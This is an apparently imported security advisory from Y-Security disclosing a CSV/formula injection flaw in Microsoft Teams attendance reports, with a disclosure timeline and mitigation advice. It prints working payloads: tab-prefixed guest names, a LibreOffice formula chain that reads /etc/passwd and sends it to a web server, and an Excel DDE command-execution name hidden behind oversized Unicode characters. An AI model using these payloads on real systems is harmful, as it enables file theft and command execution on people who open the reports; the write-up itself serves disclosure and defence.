---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-12-01_microsoft-teams-csv-injection.md
original_filename: 2021-12-01_microsoft-teams-csv-injection.md
title: Microsoft Teams – CSV Injection
category: documents
detected_topics:
- sso
- access-control
- command-injection
- automation-abuse
- cloud-security
tags:
- imported
- documents
- sso
- access-control
- command-injection
- automation-abuse
- cloud-security
language: en
raw_sha256: a56ea01ee33c80c5b55f3d172f80abd9a02df12bca16b270a1e700d282c8aad1
text_sha256: 13e963f3da2e216a6716359e8394a6277640422206aefa78eca7e0d256332b76
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Microsoft Teams – CSV Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-12-01_microsoft-teams-csv-injection.md
- Source Type: markdown
- Detected Topics: sso, access-control, command-injection, automation-abuse, cloud-security
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `a56ea01ee33c80c5b55f3d172f80abd9a02df12bca16b270a1e700d282c8aad1`
- Text SHA256: `13e963f3da2e216a6716359e8394a6277640422206aefa78eca7e0d256332b76`


## Content

---
title: "Microsoft Teams – CSV Injection"
page_title: "Microsoft Teams - CSV Injection - Y-Security GmbH"
url: "https://www.y-security.de/news-en/microsoft-teams-csv-injection/index.html"
final_url: "https://www.y-security.de/news-en/microsoft-teams-csv-injection/index.html"
authors: ["Christian Becker (@0xchrisb)"]
programs: ["Microsoft"]
bugs: ["CSV injection"]
publication_date: "2021-12-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3126
---

##  Microsoft Teams – CSV Injection 

**Item** |  **Comment**  
---|---  
Software  |  Microsoft Teams on Windows, Linux and the Web  
Version  |  Latest Available as of 01.12.2021  
Type of Issue  |  CSV Injection / Formula Injection  
CWE  |  [**https://cwe.mitre.org/data/definitions/1236.html**](https://cwe.mitre.org/data/definitions/1236.html)  
OWASP  |  [**https://owasp.org/www-community/attacks/CSV_Injection**](https://owasp.org/www-community/attacks/CSV_Injection)  
Roles affected  |  Meeting Organizer  
CVSS  |  **[Medium – 4.4](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N&version=3.1)**  
Credits  |  [**Christian Becker**](https://twitter.com/0xchrisb) from Y-Security  
  
**Microsoft Teams on Windows, Linux and the Web suffers from a CSV Injection / Formula Injection vulnerability that could be exploited by an unauthenticated user.**

  
With specially crafted usernames it is possible to insert malicious content into a generated attendance report. This can be used to execute arbitrary operating system commands or exfiltrate content from the file system if opened in processor like Microsoft Excel or LibreOffice Calc. Additionally, it could be used to manipulate the attendance list. 

##  Summary 

Microsoft Teams on Windows, Linux and the Web automatically generates an “Attendance report” after a meeting, which can be downloaded by the meeting organizer. The report is downloaded in JSON format from **[https://api.cortana.ai](https://api.cortana.ai/)**[/](https://api.cortana.ai/) and converted within Microsoft Teams or the user’s browser to a CSV (Comma-separated values) file. Content of the created file is not properly escaped during the conversion and therefore allows CSV Injection/Formula Injection. 

The vulnerability can be exploited without authentication by a “Guest” user of the meeting by choosing a malicious name. Additionally, it could be exploited by an organizer of the meeting by choosing a malicious meeting name. Final exploitation of the vulnerability does not happen within Teams, but in software opening/interpreting the CSV file, such as Microsoft Excel or LibreOffice Calc. 

An attacker exploiting this vulnerability may be able to: 

  * Execute arbitrary operating system commands 
  * Exfiltrate content from the spreadsheet, or other opened spreadsheets 
  * Manipulate the attendance list 

##  Vulnerability Details 

In 2021 Microsoft added the “Attendance report” download functionality to Microsoft Teams, which can be used to “track student attendance in online classes” (**[Ref](https://docs.microsoft.com/en-us/microsoftteams/teams-analytics-and-reports/meeting-attendance-report)**). Please note, this feature is not available to all user and access permissions may need to be set by the administrator as described in the [**documentation**](https://docs.microsoft.com/en-us/microsoftteams/meeting-policies-in-teams#meeting-policy-settings---meeting-attendance-report). However, the generated CSV file is expected to be downloaded and processed: “For example, the teacher can download the attendance report at the start of class as a simple way to do a ‘roll call'” ([**Ref**](https://docs.microsoft.com/en-us/microsoftteams/teams-analytics-and-reports/meeting-attendance-report)). The below file was automatically generated after a meeting: 
  
  
  Meeting Summary  
  Total Number of Participants  6  
  Meeting Title  Y-Security Meeting  
  Meeting Start Time  7/29/2021, 10:58:25 AM  
  Meeting End Time  7/29/2021, 11:35:28 AM  
  Debug Id  &lt;Truncated>  
  
  Full Name  Join Time  Leave Time  Duration  userPrincipalName  Role
  Christian Becker  7/29/2021, 10:58:25 AM  7/29/2021, 11:35:28 AM  37m 2s  &lt;truncated>  Organizer
  Sven Schlüter  7/29/2021, 10:58:40 AM  7/29/2021, 11:35:27 AM  36m 47s &lt;truncated>  Presenter
  Guest1  7/29/2021, 11:00:19 AM  7/29/2021, 11:35:26 AM  35m 6s  &lt;truncated>  Attendee
  Guest2  7/29/2021, 11:01:05 AM  7/29/2021, 11:35:25 AM  34m 20s &lt;truncated>  Attendee
  Guest3  7/29/2021, 11:01:06 AM  7/29/2021, 11:35:25 AM  34m 19s &lt;truncated>  Attendee
  Guest4  7/29/2021, 11:01:09 AM  7/29/2021, 11:35:25 AM  34m 15s &lt;truncated>  Attendee
  

**While looking at the generated report, we identified that a guest user can set their name to almost all characters with a total length of 50. This also included unicode characters.**

Having this limitation in mind, we started looking around for a CSV Injection vulnerability. A CSV Injection vulnerability is something common and tracked as [**CWE-1236: Improper Neutralization of Formula Elements in a CSV File**](https://cwe.mitre.org/data/definitions/1236.html) and fully written up in the OWASP Community Pages under **[CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)**. Summed up, it allows an attacker to place untrusted input in a CSV file, which can be used to executed formulas in programs like Microsoft Excel or LibreOffice Calc. 

We started choosing usernames having characters in the beginning of the name that are typically used for CSV Injection. Unfortunately, the CSV export functionality was found to properly escape characters, such as `=`, `-`, `+`, `@` when they have been placed in the beginning of the name. For example `=testuser` would result in `\=testuser` when downloading the CSV file via Microsoft Teams. 

However, we identified that it is possible to specify a horizontal tab character (with and without URL encoding), such as `%09` in the beginning of the name. If a username of `%09=5*20%09` is chosen, the “tab separated” CSV file (even though it is called “Comma-separated”, the file can have different delimiter) would skip the first cell when importing the file and the second cell would then start with the formula `=5*20`. The additional `tab` character after the formula is used to move the automatically added string `(Guest)` into a new cell during the import. The generated CSV file would then look like 
  
  
  Meeting Summary
  Total Number of Participants  2
  Meeting Title  Poc Meeting
  Meeting Start Time  7/30/2021, 10:12:47 AM
  Meeting End Time  7/30/2021, 10:12:59 AM
  
  Full Name  Join Time  Leave Time  Duration  Email  Role
  Christian Becker  7/30/2021, 10:12:47 AM  7/30/2021, 10:12:59 AM  12s  &lt;truncated>  Organizer
  =5*20  (Guest)  7/30/2021, 10:12:52 AM  7/30/2021, 10:12:57 AM  5s  Attendee
  

##  Proof of Concept 

With the proof that arbitrary content can be inserted into generated CSV files, we went a step further and created Proof of Concepts to show the impact of the vulnerability. As stated before, the actual exploitation of the vulnerability does not happen within Microsoft Teams, but in programs that are used to interpret the generated CSV file. All Proof of Concepts follow the same approach in which: 

  1. A user with authorization to download a meeting policy needs to setup a Microsoft Teams meeting 
  2. The organizer needs to join the meeting 
  3. A guest user with the meeting invite can join the meeting having a malicious name set 
  4. Depending on the configuration of the meeting, the user needs to be accepted as “If someone waits in the lobby and doesn’t get admitted to the meeting, they won’t be included in the report” ([**Ref**](https://support.microsoft.com/en-us/office/view-and-download-meeting-attendance-reports-in-teams-ae7cf170-530c-47d3-84c1-3aedac74d310?ui=en-us&rs=en-us&ad=us)) 
  5. The organizer needs to leave the call as this triggers the CSV file generation, which takes roughly 5 minutes 
  6. Download and open the CSV file with for example Microsoft Excel or LibreOffice Calc 

Various attack vectors exist in Microsoft Excel and LibreOffice Calc that could be used to execute arbitrary operating system commands or exfiltrate data from the user’s system. Please note that both applications do have some measurements in place, but depending on the user awareness and configuration, they may not be sufficient. 

###  Data Manipulation 

One of the first Proof of Concepts we build was a simple data manipulation. We wanted to fake a user as (internal) attendant who actually hasn’t been on the meeting – Remember, Microsoft Teams automatically added `(Guest)` to the username when joining from outside the organization. This doesn’t sound crucial for meetings where only a few attendees join, but might be useful for meetings with lots of people joining or where attendance is required. A Guest user injecting a malicious username into the CSV file, would be able to place arbitrary user into the file. For example, a username of `Eve%09=B8%09=C8%09=D8%09=E8%09=F8%0a%0dBob` could be used to generate a CSV file that looks like the below when opening in Microsoft Excel or LibreOffice Calc: 

![](../../y-content/uploads/2021/08/MCRC-66585-Excel.png)

The injected username would place the name Eve in cell A9, then add the same value as B8 into B9, the same value as C8 in C9, etc. Additionally, it would place a second user named Bob in a new line which has the original values of Eve assigned. 

###  LibreOffice Calc – Data Exfiltration 

The name of a guest user can only be 50 characters long. However, multiple “guest” user can join one after the other to place a malicious payload in the CSV file that is later concatenated. In a meeting where only the meeting organizer has joined yet, the following guest user could join one after the other to exfiltrate content of the /etc/passwd file from a Linux system: 

  1. `%09=ENCODEURL('file:///etc/passwd'#$passwd.A1)%09`
  2. `%09=CONCATENATE("http://127.0.0.1:1337/",B9)%09`
  3. `%09=WEBSERVICE(B10)%09`

The generated CSV file may then look like the below, which reads and encodes content of the /etc/passwd file (User1), adds the content to an arbitrary URL (User2) and then performs a web request to the concatenated URL: 
  
  
  Meeting Summary
  Total Number of Participants  4
  Meeting Title  PocMeeting-LibreOffice
  Meeting Start Time  7/30/2021, 10:34:37 AM
  Meeting End Time  7/30/2021, 10:37:16 AM
  
  Full Name  Join Time  Leave Time  Duration  Email  Role
  Christian Becker  7/30/2021, 10:34:37 AM  7/30/2021, 10:37:13 AM  2m 36s  &lt;truncated>  Organizer
  =ENCODEURL('file:///etc/passwd'#$passwd.A1)  (Guest)  7/30/2021, 10:36:13 AM  7/30/2021, 10:37:16 AM  1m 3s  Attendee
  =CONCATENATE("http://127.0.0.1:1337/",B9)  (Guest)  7/30/2021, 10:36:17 AM  7/30/2021, 10:37:13 AM  56s  Attendee
  =WEBSERVICE(B10)  (Guest)  7/30/2021, 10:36:20 AM  7/30/2021, 10:37:12 AM  51s  Attendee
  

In this case we have used a local webserver listening on port 1337 which showed the below lines in the access logs: 
  
  
  "OPTIONS /root%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A%2Fbin%2Fbash HTTP/1.1" 501 -
  "HEAD /root%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A%2Fbin%2Fbash HTTP/1.1" 404 -
  "GET /root%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A%2Fbin%2Fbash HTTP/1.1" 404 -
  

###  Microsoft Excel – Command Execution 

In Microsoft Excel it is also possible to execute operating system commands, if enabled in the configuration of Excel. During a meeting an attacker could for example join with a name of `%09=cmd|' /C calc'!'A112'%09` to open the Calculator application. 

A user joining with such a name would likely be spotted as malicious and the organizer may not allow those user to join the meeting.Therefore, we looked a little bit deeper into obfuscating this attack vector. We then identified that Microsoft Teams allows unicode characters/symbols in the name, which can be used to not display the full name of a user, while the user is in the lobby or joined the meeting. Usually, characters have more or less the same size, but special characters exist that are larger than others and also overlap other characters. For example the Myanmar Letter Au `ဪ` (0x102A) is the largest unicode character and is the one we use in our Proof of Concept. If a user with the name of `💖YSecဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪ%09=cmd|' /C calc'!'A112'` joins, then it looks like this while the user is in the lobby and after the user joined the meeting: 

![](../../y-content/uploads/2021/08/MCRC-66585-Lobby1.png)

![](../../y-content/uploads/2021/08/MCRC-66585-Lobby2.png)

![](../../y-content/uploads/2021/08/MCRC-66585-Joined1.png)

###  Further Attack Vectors 

In the beginning of this post we briefly mentioned that a similar injection point can be triggered by a meeting organizer (or someone who has delegation rights for meetings) when setting a malicious meeting name. We found that when a meeting is created via Microsoft Teams (and not Microsoft Outlook), it is possible to execute a formula such as `=4*20` when setting the meeting name. A meeting created via Microsoft Outlook would result in a meeting title of `null` during the CSV export. 
  
  
  Meeting Summary
  Total Number of Participants  1
  Meeting Title  =4*20
  Meeting Start Time  7/30/2021, 11:28:10 AM
  Meeting End Time  7/30/2021, 11:28:22 AM
  
  Full Name  Join Time  Leave Time  Duration  Email  Role
  Christian Becker  7/30/2021, 11:28:10 AM  7/30/2021, 11:28:22 AM  11s  &lt;truncated>  Organizer
  

##  Mitigation & Recommendation 

The vulnerability has not yet been mitigated in Microsoft Teams. Therefore, we recommend to not allow Dynamic Data Exchange (DDE) in your data processor like Microsoft Excel or LibreOffice Calc. In general, it is recommended to surround characters by double quotes (” “) or always escape characters that can be used as part of a formula injection such as: 

  * Equals to (=) 
  * Plus (+) 
  * Minus (-) 
  * At (@) 
  * Comma (,) 
  * Tab (0x09) 
  * Line feed (0x0a) 
  * Carriage return (0x0D) 

Additionally, we recommend to not allow user with URL-encoded names to join your meetings and we recommend to disable this functionality until a patch has been supplied. 

##  Disclosure Policy 

At Y-Security we take security vulnerabilities seriously and follow a [**responsible disclosure policy**](../../disclosure-policy/index.html). Even though this feature in Microsoft Teams is not available to all users, it poses a risk to those who use it and allow external guests to meetings. The 90-day disclosure deadline has been extended by 30 days during the disclosure process due to insufficient remediation of the vulnerability. The vulnerability was publicly disclosed after exceeding the additional 30 days. 

##  Disclosure Timeline 

****DATE**** |  ****COMMENT****  
---|---  
29.07.2021  |  Vulnerability Identification & Proof of Concept created  
30.07.2021  |  Vulnerability reported to Microsoft Security Response Center (MSRC)  
03.08.2021  |  MSRC Case 66585 was assigned  
17.08.2021  |  Update Requested from MSRC  
20.08.2021  |  MSRC confirmed the case is in final stages of investigation  
03.09.2021  |  Update Requested from MSRC  
10.09.2021  |  MSRC is currently evaluating the fix  
15.09.2021  |  MSRC confirmed fix will be available until 30/10/2021  
30.09.2021  |  MSRC is working on a fix  
26.10.2021  |  MSRC confirmed that fix will be rolled out till 05/11/2021  
27.10.2021  |  Disclosure Deadline of 90 days Hit & Extended Till Fix Release  
27.10.2021  |  Draft Writeup send to MSRC  
06.11.2021  |  MSRC confirmed that the fix has fully propagated  
07.11.2021  |  Incomplete fix in Microsoft Teams 1.4.00.29469 (64-bit). Further information provided.  
19.11.2021  |  MSRC could not reproduce the vulnerability  
21.11.2021  |  Video showing the exploitation in Microsoft Teams 1.4.00.31569 (64-bit) provided  
23.11.2021  |  Informed MSRC about scheduled public disclosure at the 26/11/2021  
23.11.2021  |  MSRC requested additional days due to public holidays in the US  
24.11.2021  |  Informed MSRC about final scheduled public disclosure at the 01/12/2021  
24.11.2021  |  MSRC confirmed that the issue with the fixed was identified and will be pushed to production  
01.12.2021  |  MSRC requested additional days  
01.12.2021  |  Request Declined  
01.12.2021  |  Coordinated Public Disclosure  
  
##  Read more articles 

[__# Previous Post Threat Simulation – Mimicking an APT](../threat-simulation-mimicking-an-apt/index.html)

[__# Next Post Microsoft Azure Portal – CSV Injection](../microsoft-azure-portal-csv-injection/index.html)
